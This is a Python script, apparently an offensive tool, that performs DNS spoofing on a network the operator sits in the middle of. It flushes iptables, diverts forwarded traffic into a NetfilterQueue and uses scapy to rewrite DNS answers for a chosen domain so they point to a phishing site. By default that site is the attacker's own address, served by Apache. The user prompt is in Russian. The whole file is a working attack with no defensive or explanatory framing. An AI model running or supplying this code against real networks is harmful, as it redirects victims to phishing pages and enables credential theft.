from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from subprocess import call
def set_load(packet):
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len
    return packet


def process_packet(packet, url, fishing_site):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSQR):
            qname = scapy_packet[scapy.DNSQR].qname.decode() 
            if url in qname:
                print('[+] Spoofing')
                print(scapy_packet[scapy.DNS])
                answer = scapy.DNSRR(rrname=qname, rdata=fishing_site)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                set_load(scapy_packet)
                packet.set_payload(bytes(scapy_packet))
        packet.accept()
    except: pass
    

def net_cut(url, fishing_site=scapy.ARP().psrc):
    try:
        call(['iptables','--flush'])
        call('iptables -I FORWARD -j NFQUEUE --queue-num 0'.split())
        if fishing_site == scapy.ARP().psrc:
            call('service apache2 start'.split())
        url = '.'.join(url.replace('http://','').replace('https://','').split('.')[:-1])
        queue = NetfilterQueue()
        queue.bind(0, lambda packet: process_packet(packet, url, fishing_site=fishing_site))
        queue.run()
    except KeyboardInterrupt:
        pass
    except:
        print('Error')

if __name__ == '__main__':
    url = input('Введите url (только http): ')
    net_cut(url)
